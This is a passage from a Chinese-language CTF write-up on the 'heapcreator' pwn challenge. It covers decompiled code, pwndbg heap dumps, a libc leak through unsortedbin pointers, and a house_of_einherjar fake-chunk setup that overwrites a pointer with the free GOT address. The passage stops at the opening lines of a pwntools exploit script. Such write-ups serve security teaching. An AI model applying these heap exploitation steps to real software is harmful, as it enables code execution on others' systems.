class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br></pre></td></tr></table></figure>\n<p>show 这里也没有什么特殊的，</p>\n<h3 id=\"free\"><a class=\"markdownIt-Anchor\" href=\"#free\">#</a> Free</h3>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">unsigned</span> __int64 <span class=\"title function_\">delete_heap</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">int</span> v1; <span class=\"comment\">// [rsp+Ch] [rbp-14h]</span></span><br><span class=\"line\">  <span class=\"type\">char</span> buf[<span class=\"number\">8</span>]; <span class=\"comment\">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class=\"line\">  <span class=\"type\">unsigned</span> __int64 v3; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v3 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Index :&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">4uLL</span>);</span><br><span class=\"line\">  v1 = atoi(buf);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt; <span class=\"number\">0</span> || v1 &gt; <span class=\"number\">9</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Out of bound!&quot;</span>);</span><br><span class=\"line\">    _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( *(&amp;heaparray + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>((<span class=\"type\">void</span> *)(*(&amp;heaparray + v1))-&gt;ptr);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*(&amp;heaparray + v1));</span><br><span class=\"line\">    *(&amp;heaparray + v1) = <span class=\"number\">0LL</span>;                   <span class=\"comment\">// 只清空了heaparray,结构体中指针未清空，</span></span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Done !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;No such heap !&quot;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> __readfsqword(<span class=\"number\">0x28</span>u) ^ v3;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>free 模块这里，其实仔细看，会发现虽然 free 后将 bss 段上的指针清空了，但是结构体的 ptr 成员并没有清空，但是这了 uaf 并不是很容易利用。因为 bss 段上的指针被清空了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">trr</span>&#123;</span></span><br><span class=\"line\">\t<span class=\"type\">size_t</span> size; \t\t<span class=\"comment\">//记录大小</span></span><br><span class=\"line\">\t<span class=\"type\">void</span> * ptr;\t\t\t<span class=\"comment\">//储存我们输入Content</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ss:<span class=\"number\">00000000006020</span>A0 ; trr *heaparray</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A0 heaparray       dq ?                    ; DATA XREF: create_heap+<span class=\"number\">31</span>↑r</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A0                                         ; create_heap+<span class=\"number\">54</span>↑w ...</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A8                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>A9                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AA                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AB                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AC                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AD                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AE                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020</span>AF                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>0                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>1                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>2                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>3                 db    ? ;</span><br><span class=\"line\">.bss:<span class=\"number\">00000000006020B</span>4                 db    ? ;</span><br></pre></td></tr></table></figure>\n<p>题目大概就是这样，初步我们看到了一个 off_by_one 漏洞，以及一个不是很理想 UAF</p>\n<h2 id=\"pwning\"><a class=\"markdownIt-Anchor\" href=\"#pwning\">#</a> pwning</h2>\n<h3 id=\"开始前的准备\"><a class=\"markdownIt-Anchor\" href=\"#开始前的准备\">#</a> 开始前的准备</h3>\n<p>首先这个题并没有后门，那么我们就要去泄露 libc 的基地址。然后再去考虑其他的</p>\n<h3 id=\"leak-the-libc_base\"><a class=\"markdownIt-Anchor\" href=\"#leak-the-libc_base\">#</a> leak the libc_base</h3>\n<p>这里我们关注到的是在申请到堆块之后，并没有对其进行初始化，只是对储存有 content 的堆块检查读入的数据是否为 0 字节，也就是说我们至少读入一个字节，不过因为使用的 read 函数，所以不会自动的添加换行符，但这无所谓，这里将一个比较常用的 unsortedbins 泄露基地址 main_arena. 当一个较大的 chunk 超过了 fastbins 的范围，就会被加入 unsortedbins 双链表中。其实，第一个堆块的 fd,bk 指针会指向 main_arena+x,。当我们再次申请到这个 chunk 时，其 fd,bk 指针不会被清空，只是会被我们输入的 content 覆盖。但是我们输入的 content 只检查了至少输入一个字节，而且允许我们输入’\\x00’空字符。</p>\n<p>那么这里就有了完整的泄露的思路</p>\n<p>申请一个 0x80 的堆块（实际得到的 0x90）, 然后将其释放。因为这个是一个嵌套的堆块，delete 的时候先释放 content, 再释放 struct</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x2368000</span>\t\t\t<span class=\"comment\">//struct_trr</span></span><br><span class=\"line\"><span class=\"number\">0x2368000</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000021</span></span><br><span class=\"line\"><span class=\"number\">0x2368010</span>:\t<span class=\"number\">0x0000000000000080</span>\t<span class=\"number\">0x0000000002368030</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x2368020</span>\t\t\t<span class=\"comment\">//content</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p>free 后</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; bins</span><br><span class=\"line\">fastbins</span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x2368000</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x40</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x50</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x70</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x80</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x2368020</span> —▸ <span class=\"number\">0x7fb1f48beb78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x2368020</span></span><br><span class=\"line\">smallbins</span><br><span class=\"line\">empty</span><br><span class=\"line\">largebins</span><br><span class=\"line\"></span><br><span class=\"line\">##########################################################<span class=\"meta\">#    </span></span><br><span class=\"line\"><span class=\"meta\">pwndbg&gt; x/4gx 0x2368020</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x00007fb1f48beb78</span>\t<span class=\"number\">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>\n<p>重新申请后，只要控制 conten 的长度不会将 bk 指针释放释放，同时字符串可以将 bk 链接起来，就可以再 show 的时候，将 bk 泄露出来</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">2</span>gx <span class=\"number\">0x2368010</span></span><br><span class=\"line\"><span class=\"number\">0x2368010</span>:\t<span class=\"number\">0x0000000000000080</span>\t<span class=\"number\">0x0000000002368030</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">4</span>gx <span class=\"number\">0x0000000002368030</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x2368020</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000091</span></span><br><span class=\"line\"><span class=\"number\">0x2368030</span>:\t<span class=\"number\">0x6161616161616161</span>\t<span class=\"number\">0x00007fb1f48beb78</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"关键point\"><a class=\"markdownIt-Anchor\" href=\"#关键point\">#</a> 关键 point</h3>\n<p>这个题的关键难点在于适合实现 shell，劫持 malloc_hook 也好，覆盖 got 表也好都需要实现任意地址写，这里我们用到一个 unlink 手法 house_of_einherjar。这项技术使用的前提就是存在溢出，至少 1 字节，来修改一个 allocated_chunk 的 prev_size 和 prev_inuse。</p>\n<blockquote>\n<p>house_of_einherjar======&gt;<br>\n 而此手法有几个点值得关注，1，我们可以认为的修改一个 allocted_chunk 的 prev_size, 以及 prev_inuse. 我们需要构造一个 fake_chunk (一个方面泄露栈地址，在栈上伪造一个 chunk，这个方法配合修改 eip 使用，但是因为栈的内容会发生变化，就要进一步思考控制具体到哪里。其二可以在 bss 段上伪造 chunk，达到修改全局变量的目的。其三可以控制到 got 表，修改 got 表。其四控制到 malloc_hook,free_hook,reallok_hook, 使用 onegadget)。 prev_size = victim_chunk_size - aimed_address。 同时我们还需要利用 victim 的前一个 allocted chunk A， 申请的大小不要使 16 位对齐，0x10*k+8, 这样就可以在申请到 victim B 后，prev_size 允许被 A 使用，同时可以利用 off_by_one 技术 NULL 溢出修改 B 的 prev_inuse（将其改为 0），这样 unlink 通过 chunk_addr_B - prev_size 定位到 fake_chunk, 因为 bss 以及栈地址通常会比 heap 地址大，所以 prev_size 传入的是一个负数，但是因为 prev_size 是无符号数，发生溢出，就这样虽然我们 free B，向前 unlink，结果其实把后面的 fakechunk 合并到一起，而且新的堆头地址是 fakechunk。注意构造 fake_chunk 时，要保证其可以 pass unlink 的检查</p>\n<p>p-&gt;fd-&gt;bk=p,p-&gt;bk-&gt;fd=p,p-&gt;prev_size = p-&gt;bk-&gt;size，p-&gt;fd-&gt;prev_size = p-&gt;size, 最简单的就是将 fd、bk 指向自己。unlink 时，不会改变被合并的堆块的数据，只会更改新的堆头数据，此时 fakechunk 就是新的 topchunk</p>\n</blockquote>\n<p>我们在对快中伪造一个个 fakechunk，然后修改 victim_chunk, 这里要注意的是，victim_chunk 必须与 topchunk 相邻，才可以实现 fake_top_chunk. 这里细解释下为什么这样做，这样做的目的是，在 unlink 前，我们已经申请出一些堆块，比如存在一个结构体堆块，而这个堆块的地址比 fakechunk 大，那么 unlink 后，这个堆块的数据不变，但是 topchunk 的位置在这个堆块之前，我们就可以再次利用到这个堆块，换言之，我们申请一个很大堆块，那么刚刚所说 结构体会被包含，当我们编辑这个大堆块的内容时，控制长度就可以将其覆盖，而我们有知道结构体里面还有一个 content 的指针，如果我们把这个覆盖这个指针，就实现了任意地址写。</p>\n<p>这里要解决几个问题，每次创建的时候会申请出来两个堆块，一个大小 0x20, 一个为 size。为了溢出，我们就要考虑堆块的布局，这里我提供一种</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>,<span class=\"string\">&quot;\\x00&quot;</span>)\t\t<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)\t\t<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">&#x27;aaaa&#x27;</span>)\t\t<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x88</span>,<span class=\"string\">&#x27;ssss&#x27;</span>)\t\t<span class=\"comment\">#3</span></span><br><span class=\"line\">free(<span class=\"number\">3</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n<p>0 用来 leak libc_base, 我们重复利用，1 我们构造了两个大小相等的堆块</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0x21</span>:struct0---&gt; struct1 ---&gt;content1 ---&gt;struct2 ---&gt;struct3 ---&gt;<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"number\">0x61</span>:conten2 ---&gt;<span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\">unsortedbins: content0 ---&gt;content3 ---&gt;main_arena\t\t\t<span class=\"comment\">//(FIFO)</span></span><br><span class=\"line\">    </span><br><span class=\"line\"> fastbins</span><br><span class=\"line\"><span class=\"number\">0x20</span>: <span class=\"number\">0x2368000</span> —▸ <span class=\"number\">0x23680b0</span> —▸ <span class=\"number\">0x23680d0</span> —▸ <span class=\"number\">0x23680f0</span> —▸ <span class=\"number\">0x2368170</span> ◂— ...</span><br><span class=\"line\"><span class=\"number\">0x30</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x40</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x50</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x60</span>: <span class=\"number\">0x2368110</span> ◂— <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x70</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\"><span class=\"number\">0x80</span>: <span class=\"number\">0x0</span></span><br><span class=\"line\">unsortedbin</span><br><span class=\"line\">all: <span class=\"number\">0x2368020</span> —▸ <span class=\"number\">0x7fb1f48beb78</span> (main_arena+<span class=\"number\">88</span>) ◂— <span class=\"number\">0x2368020</span></span><br></pre></td></tr></table></figure>\n<p>在重新申请堆块的过程中我们还要完成堆地址的泄露，这里其实有两个选择，一种是将 struct 申请作为 content，因为 free 的时候，struct.ptr 没有被清空，可以被泄露。另外一种就是不考虑时那种堆块，只要不是 fastbin 的最后一个，申请出来时，fd 指针没有被清空，此时我们输入的 content 只要时其最低字节就可以（heap 的地址最低三字节一定是 0x000，通过计算 可以得到对低字节）。content3 与 topchunk 相邻，释放后会与其合并，我们不需要考虑，因为 unsortedbin 里只有 0x90 的 content0，只要申请的堆块比他大，就会从 topchunk 获取，因为 0x21 大小的堆块在 fastbin 里面有好几个，就可以是的从 topchunk 连续获得两个较大的堆块，这样 edit 前面堆块就可以完成溢出，fake chunk 的构造需要一定的空间，所以我们使用了 0x50 的堆块。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">fakechunk:<span class=\"number\">0x2368120</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">12</span>gx <span class=\"number\">0x0000000002368120</span><span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x2368110</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000061</span></span><br><span class=\"line\"><span class=\"number\">0x2368120</span>:\t<span class=\"number\">0x0000000000000100</span>\t<span class=\"number\">0x0000000000000110</span><span class=\"comment\">//fakesize = victim_prev_size</span></span><br><span class=\"line\"><span class=\"number\">0x2368130</span>:\t<span class=\"number\">0x0000000002368120</span>\t<span class=\"number\">0x0000000002368120</span><span class=\"comment\">//为了方便绕过检查，fd,bk直接指向fakechunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368140</span>:\t<span class=\"number\">0x0000000002368120</span>\t<span class=\"number\">0x0000000002368120</span></span><br><span class=\"line\"><span class=\"number\">0x2368150</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368160</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"> fake_size = fake_prev_size = victimchunk-fakechunk</span><br><span class=\"line\"> pwndbg&gt; x/<span class=\"number\">18</span>gx <span class=\"number\">0x00000000023681a0</span><span class=\"number\">-0x10</span>\t\t<span class=\"comment\">//victimchunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368190</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000a1</span></span><br><span class=\"line\"><span class=\"number\">0x23681a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681c0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681e0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368200</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368210</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\">pwndbg&gt; x/<span class=\"number\">24</span>gx <span class=\"number\">0x00000000023681a0</span><span class=\"number\">-0x10</span>\t\t<span class=\"comment\">//edit时覆盖victimchunk</span></span><br><span class=\"line\"><span class=\"number\">0x2368190</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x00000000000000a1</span></span><br><span class=\"line\"><span class=\"number\">0x23681a0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681b0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681c0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681d0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681e0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x23681f0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368200</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368210</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368220</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x2368230</span>:\t<span class=\"number\">0x0000000000000110</span>\t<span class=\"number\">0x0000000000000130</span></span><br><span class=\"line\"><span class=\"number\">0x2368240</span>:\t<span class=\"number\">0x0000000000006262</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>这里就完成了布局，现在只要 free victim_chunk</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/8gx 0x0000000002368120-0x10</span><br><span class=\"line\">0x2368110:\t0x0000000000000000\t0x0000000000000061</span><br><span class=\"line\">0x2368120:\t0x0000000000000100\t0x0000000000020ee1</span><br><span class=\"line\">0x2368130:\t0x0000000002368120\t0x0000000002368120</span><br><span class=\"line\">0x2368140:\t0x0000000002368120\t0x0000000002368120</span><br><span class=\"line\">//此时fakechunk的size变了，其实这就是fakesize+victim_size+topchunk_size</span><br></pre></td></tr></table></figure>\n<p>这个时候我们在申请一个堆块，并填充一些东西（偏移量在调试中查看）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pad = <span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>+ <span class=\"string\">b&#x27;\\x00&#x27;</span> * (<span class=\"number\">0x180</span>-<span class=\"number\">0x130</span>-<span class=\"number\">16</span>) +p64(<span class=\"number\">0x21</span>)+p64(<span class=\"number\">50</span>) +p64(free_got)</span><br><span class=\"line\">add(<span class=\"number\">0x200</span>,pad)</span><br></pre></td></tr></table></figure>\n<p>新申请的堆块就是从 fakechunk 开始分配，后面自行调试偏移量</p>\n<h2 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.log_level = &#x27;debug&#x27;</span></span><br><span class=\"line\">r=process(<span class=\"string\">&#x27;./heapcreator&#x27;</span>)</span><br><span class=\"line\">elf =ELF(<span class=\"string\">&quot;./heapcreator&quot;</span>)</span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">&#x27;free&#x27;</span>]</span><br><span 